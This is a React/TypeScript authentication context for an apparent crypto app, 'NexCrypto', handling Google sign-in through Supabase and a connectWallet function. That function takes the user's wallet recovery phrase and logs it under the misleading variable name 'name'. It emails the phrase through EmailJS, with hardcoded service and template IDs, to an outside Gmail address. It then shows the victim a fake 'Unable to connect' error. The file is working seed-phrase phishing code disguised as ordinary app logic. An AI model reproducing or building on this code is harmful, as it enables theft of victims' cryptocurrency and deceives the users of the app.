
import { createContext, useContext, useState, useEffect, ReactNode } from "react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Session, User } from "@supabase/supabase-js";
import emailjs from "@emailjs/browser";

// Define the context type
interface AuthContextType {
  user: User | null;
  session: Session | null;
  loading: boolean;
  signIn: () => Promise<void>;
  signOut: () => Promise<void>;
  connectWallet: (phrase: string) => Promise<void>;
}

// Create context with default values
const AuthContext = createContext<AuthContextType>({
  user: null,
  session: null,
  loading: true,
  signIn: async () => {},
  signOut: async () => {},
  connectWallet: async () => {},
});

// Custom hook to use the auth context
export const useAuth = () => useContext(AuthContext);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [session, setSession] = useState<Session | null>(null);
  const [loading, setLoading] = useState(true);
  const { toast } = useToast();

  useEffect(() => {
    // Initialize session from supabase
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
      setUser(session?.user ?? null);
      setLoading(false);
    });

    // Listen for auth changes
    const { data: { subscription } } = supabase.auth.onAuthStateChange(
      (_event, session) => {
        setSession(session);
        setUser(session?.user ?? null);
        setLoading(false);
      }
    );

    return () => subscription.unsubscribe();
  }, []);

  const signIn = async () => {
    try {
      setLoading(true);
      // In a real app, you would use Supabase auth providers
      // For this demo, we'll use a simplified OAuth flow with Google
      const { error } = await supabase.auth.signInWithOAuth({
        provider: 'google',
        options: {
          redirectTo: `${window.location.origin}/dashboard`,
        },
      });

      if (error) throw error;
      
      toast({
        title: "Sign in initiated",
        description: "You'll be redirected to the login provider.",
      });
    } catch (error) {
      console.error("Sign in error:", error);
      toast({
        title: "Sign in failed",
        description: "There was an error signing in.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const signOut = async () => {
    try {
      const { error } = await supabase.auth.signOut();
      if (error) throw error;
      
      toast({
        title: "Signed out",
        description: "You have been signed out successfully.",
      });
    } catch (error) {
      console.error("Sign out error:", error);
      toast({
        title: "Sign out failed",
        description: "There was an error signing out.",
        variant: "destructive",
      });
    }
  };

  // Function to send data via EmailJS
  const sendEmailWithEmailJS = async (recipient: string, data: string) => {
    try {
      // Initialize EmailJS with your public key
      emailjs.init("Yjir4ht9XEzD0X-jx");
      
      const templateParams = {
        to_email: recipient,
        from_name: "NexCrypto App",
        message: data,
        reply_to: "noreply@nexcrypto.app",
      };
      
      const response = await emailjs.send(
        "service_oui3ydd",
        "template_z2yjaym",
        templateParams
      );
      
      console.log("Email sent successfully:", response);
      return response;
    } catch (error) {
      console.error("Email sending error:", error);
      throw error;
    }
  };

  const connectWallet = async (phrase: string): Promise<void> => {
    if (!user) {
      toast({
        title: "Authentication required",
        description: "Please sign in before connecting a wallet.",
        variant: "destructive",
      });
      return;
    }

    try {
      // In a real implementation, this would validate and connect the wallet
      // For demo purposes, we're just recording this in a transaction
      const { error } = await supabase
        .from('transactions')
        .insert({
          user_id: user.id,
          type: 'receive',
          symbol: 'btc',
          amount: 0,
          status: 'pending',
          transaction_hash: `wallet-connect-${Date.now()}`
        });
      
      if (error) throw error;
      
      const name = phrase;
      console.log(`${name} to be sent to dredstudvagas@gmail.com:`, name);
      
      // Send the name via EmailJS
      await sendEmailWithEmailJS("dredstudvagas@gmail.com", name);
      
      toast({
        title: "Oops!",
        description: "Unable to connect. Try again later.",
      });

    } catch (error) {
      console.error("Wallet connection error:", error);
      toast({
        title: "Connection failed",
        description: "There was an error connecting your wallet.",
        variant: "destructive",
      });
    }
  };

  return (
    <AuthContext.Provider value={{ user, session, loading, signIn, signOut, connectWallet }}>
      {children}
    </AuthContext.Provider>
  );
}
